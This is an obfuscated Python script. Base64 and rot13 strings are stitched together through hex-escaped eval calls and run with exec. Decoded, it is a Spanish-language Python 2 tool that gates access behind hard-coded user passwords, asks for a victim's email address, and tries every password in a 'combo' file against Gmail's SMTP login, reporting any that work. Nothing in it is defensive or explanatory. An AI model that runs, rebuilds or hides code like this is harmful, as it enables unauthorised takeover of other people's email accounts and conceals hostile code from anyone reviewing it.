import base64, codecs
magic = 'aW1wb3J0IHNtdHBsaWIKaW1wb3J0IHRpbWUgCmltcG9ydCBvcyAKd2hpbGUgVHJ1ZToKICAgIG5hbWUgPSByYXdfaW5wdXQoJ0luZ3Jlc2Ugc3Ugbm9tYnJlIGRlIHVzdWFyaW86ICcpCiAgICBpZiBuYW1lICE9ICdFbWlsaW8nIGFuZCBuYW1lICE9ICdFbW1hbnVlbCcgYW5kIG5hbWUgIT0gJ0FybWFuZG8nIGFuZCBuYW1lICE9ICdFcmljayc6CiAgICAgICAgcHJpbnQgJ05vbWJyZSBkZSB1c3VhcmlvIGluY29ycmVjdG8nCiAgICBlbHNlOgogICAgICAgIGlmIG5hbWUgPT0gJ0VtaWxpbyc6CiAgICAgICAgICAgICAgICBwYXN3X0VtaWxpbyA9IHJhd19pbnB1dCgnSW5ncmVzZSBzdSBwYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfRW1pbGlvICE9ICdBZTEydmNobCc6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1Bhc3N3b3JkIGluY29ycmVjdGEnCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdCaWVudmVuaWRvIExJREVSISAnCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ0VtbWFudWVsJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1tYW51ZWwgPSByYXdfaW5wdXQoJ0luZ3Jlc2Ugc3UgcGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0VtbWFudWVsICE9ICdyb25hbGRpdG8xJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAnUGFzc3dvcmQgaW5jb3JyZWN0YScKICAgICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgIC'
love = 'NtVPNtVPNtpUWcoaDtW0WcMJ52MJ5cMT8tLFOZFHESHvpXVPNtVPNtVPNtVPNtVPNtVPNtVPOvpzIunjbtVPNtVPNtVTIfnJLtozSgMFN9CFNaDKWgLJ5xolp6PvNtVPNtVPNtVPNtVPNtVPOjLKA3K0AuL2RtCFOlLKqsnJ5jqKDbW0yhM3Wyp2RtoTRtHTSmp3qipzD6VPpcPvNtVPNtVPNtVPNtVPNtVPOcMvOjLKA3K0AuL2RtVG0tW2uuqz9eWmbXVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW1Oup3A3o3WxVTyhL29lpzIwqTRaXDbtVPNtVPNtVPNtVPNtVPNtVPOyrTy0XPxXVPNtVPNtVPNtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPqPnJIhqzIhnJEiVRSRGHyBWlxXVPNtVPNtVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPOyoTyzVT5uoJHtCG0tW0IlnJAeWmbXVPNtVPNtVPNtVPNtVPNtVUOup3qsD2SwLFN9VUWuq19coaO1qPtaFJ5apzImLFOfLFODLKAmq29lMQbtWlxXVPNtVPNtVPNtVPNtVPNtVTyzVUOup3qsD2SwLFNuCFNapzShLKW1p2RaBtbtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtaHTSmp3qipzDtFH5QG1WFEHAHDFNaXDbtVPNtVPNtVPNtVPNtVPNtVPOyrTy0XPxXVPNtVPNtVPNtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPqPnJIhqzIhnJEiVRSRGHyBWlxXVPNtVPNtVPNtVPNtVPNtVPNtLaWyLJfXMTIzVTAbMJAerJuiXPx6PvNtp210pUAypaMypvN9VUAgqUOfnJVhH01HHPtvp210pP5gLJyfYayunT9iYzAioFVfVPN1BQpcPvNtp210pUAypaMypv5ynTkiXPxXVPOmoKEjp2IlqzIlYaA0LKW0qTkmXPxXVNbtVUImMKVtCFOlLKqsnJ5jqKDbVxIADHyZVSMWD1EWGHRtCG0+VPVcPvNt'
god = 'cGFzc3dmaWxlID0gcmF3X2lucHV0KCJSVVRBIERFTCBDT01CTyA9PT4gIikKIAogIHBhc3N3ZmlsZSA9IG9wZW4ocGFzc3dmaWxlICwgInIiKQogCiAgZm9yIHBhc3N3b3JkIGluIHBhc3N3ZmlsZToKICAgICAgICAgIHRyeToKICAgICAgICAgICAgICBzbXRwc2VydmVyLmxvZ2luKHVzZXIsIHBhc3N3b3JkKQogICAgICAgICAgICAgIHByaW50ICJbK10gLSBwYXNzd29yZCBmb3VuZCA6ICVzIiAlIHBhc3N3b3JkCiAgICAgICAgICAgICAgcmF3X2lucHV0KCJwcmVzaW9uYSBlbnRlciBwYXJhIHNhbGlyICIpLnVwcGVyCiAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICBleGNlcHQgc210cGxpYi5TTVRQQXV0aGVudGljYXRpb25FcnJvcjoKICAgICAgICAgICAgICBwcmludCAiWyFdIHBhc3N3b3JkIGluY29ycmVjdCA6ICVzICIgJSBwYXNzd29yZAoKCmRlZiBjaGVja2hvdCgpOgogIHByaW50ICgnR0FURSBPRkZMSU5FIEJSVScpCmRlZiBjaGVja2dtYWlsKCk6CiAgc210cHNlcnZlciA9IHNtdHBsaWIuU01UUCgic210cC5nbWFpbC5jb20iLCAgNTg3KQogIHNtdHBzZXJ2ZXIuZWhsbygpCiAgc210cHNlcnZlci5zdGFydHRscygpCiAKICB1c2VyID0gcmF3X2lucHV0KCJFTUFJTCBWSUNUSU1BID09PiAiKQogIHBhc3N3ZmlsZSA9IHJhd19pbnB1dCgiUlVUQSBERUwgQ09NQk8gPT0+ICIpCiAKICBwYXNzd2ZpbGUgPSBvcGVuKHBhc3N3ZmlsZSAsICJyIikKIAogIGZvciBwYXNzd29yZCBpbiBwYXNzd2ZpbGU6CiAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgc210cHNlcnZlci5sb2dpbih1c2VyLCBwYXNzd29yZCkKICAgICAgICAgIC'
destiny = 'NtVPOjpzyhqPNvJlgqVP0tpTSmp3qipzDtMz91ozDtBvNyplVtWFOjLKAmq29lMNbtVPNtVPNtVPNtVPNtVUWuq19coaO1qPtvpUWyp2yiozRtMJ50MKVtpTSlLFOmLJkcpvNvXF51pUOyptbtVPNtVPNtVPNtVPNtVTWlMJSeBjbtVPNtVPNtVPNtMKuwMKO0VUAgqUOfnJVhH01HHRS1qTuyoaEcL2S0nJ9hEKWlo3V6PvNtVPNtVPNtVPNtVPNtpUWcoaDtVyfuKFOjLKAmq29lMPOcozAipaWyL3DtBvNyplNvVPHtpTSmp3qipzDXPtbXPtbXM2S0MKZtCFNvVvVXVS9sK19sK19pXFHyWFHyWFHyYy8tVPNtVPNtVPNtVPNtVNctWlpaWl0aYGftVPNyVPHtWFNyVPHaYF5sVPNtVPNtVPNtPvNtVPNtVPNtBzVcVSjtVPNtVPNtVPNtVPNaYF4tVPNtVPNXVPNtVPNtVPN6VQcsKlxaVPNtVP4aVPNtVP4aVPNtVPNtVNbtVPNtVPNtVQbhBwbiVPNaYvptVPNhWlNtVPNtVPNtVPNtPvNtVPNtVPNto19cYlNtVQbtVPNtBlNtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNtBvNtVP4aVPNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPNtVPNtWlqtPvVvVtcjpzyhqPNbM2S0MKZcPaOlnJ50VPVdXvbdXvcAEH5IXvbdXvbdVtcjpzyhqPNaZF0tFT90oJScoPOoo2MzoTyhMI0aVNcjpzyhqPNaZv0tE21unJjtJ29hoTyhMI0aPaOlnJ50VPpmYFOMLJuio1giozkcozIqWjbXL2uunJ4tCFOcoaDbnJ5jqKDbVx9DD0yCGvN9CvNvXFxXnJLtL2uunJ49CGR6PvNtL2uyL2gbo3DbXDbtVUOup3ZXMJkcMvOwnTScow09ZwbXVPOwnTIwn2qgLJyfXPxXVPOjLKAmPzIfnJLtL2uunJ49CGZ6PvNtL2uyL2g5nT8bXDcyoUAyBtbtVUOlnJ50VPWipTAco24toz8tqzSfnJEuVTglozSfVtb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
